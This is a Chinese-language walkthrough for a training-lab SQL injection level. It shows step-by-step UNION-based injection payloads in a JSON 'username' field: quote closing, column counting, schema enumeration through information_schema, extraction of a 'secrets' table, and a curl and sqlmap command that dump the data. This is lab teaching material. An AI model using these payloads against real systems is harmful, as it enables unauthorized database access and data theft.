思路提示

本关注入点在 JSON 请求体的 username 字段里。页面提供 JSON 编辑框，点击「提交查询」会以 Content-Type: application/json 发送；也可用 Burp / curl / Postman 直接发原始 JSON。核心思路：单引号闭合 → 用 UNION SELECT 补齐 3 列 → 把要查的数据放到回显位。

详细解题过程（点击展开）
1. 确认注入点（单引号）：
{"username":"admin'"}
提交后返回 MySQL 语法错误，说明单引号未过滤。

2. 确认闭合与注释：
{"username":"admin' -- -"}
不再报错，说明可以用 ' 闭合、-- - 注释掉后面的引号。

3. 测字段数量：原查询是 SELECT id, username, role FROM users WHERE username = '$name'，共 3 列。
{"username":"admin' union select 1,1,1 -- -"}
结果表格里多出一行 1 | 1 | 1，说明 3 列全部对得上；改成 1,1,1,1 会报「列数不一致」错误。

4. 定位回显位（拿库名）：
{"username":"admin' union select 1,1,database() -- -"}
第三列显示 bafanglab —— 第 3 个字段就是回显位。

5. 拿表名：
{"username":"admin' union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) -- -"}
第三列返回 users,comments,secrets。

6. 拿列名：把 table_name 换成 column_name，条件补上表名：
{"username":"admin' union select 1,1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secrets') -- -"}
返回 id,secret,note。

7. 拿数据（通关凭证）：
{"username":"admin' union select 1,1,(select secret from secrets limit 0,1) -- -"}
第三列直接显示通关凭证。
注意：如果写成 (select secret from secrets) 不带 limit，会报 MySQL 错误：Subquery returns more than 1 row（secrets 表有多行）。这是 UNION 注入里最常见的坑：加 limit 0,1 限定一行，或用 group_concat() 合并多行即可。

8. curl 命令行验证：
curl -X POST {{SITE}}/modules/sqli/json.php -H "Content-Type: application/json" -d '{"username":"admin'\'' union select 1,1,(select secret from secrets limit 0,1) -- -"}'

9. sqlmap 自动化（只跑 UNION 技术）：
sqlmap -u "{{SITE}}/modules/sqli/json.php" --data '{"username":"admin"}' -p username --technique=U -D bafanglab -T secrets --dump --batch
小提示：JSON 字符串里的双引号要转义成 \"，单引号无需转义；-- - 后面的空格必须保留，否则注释不生效。
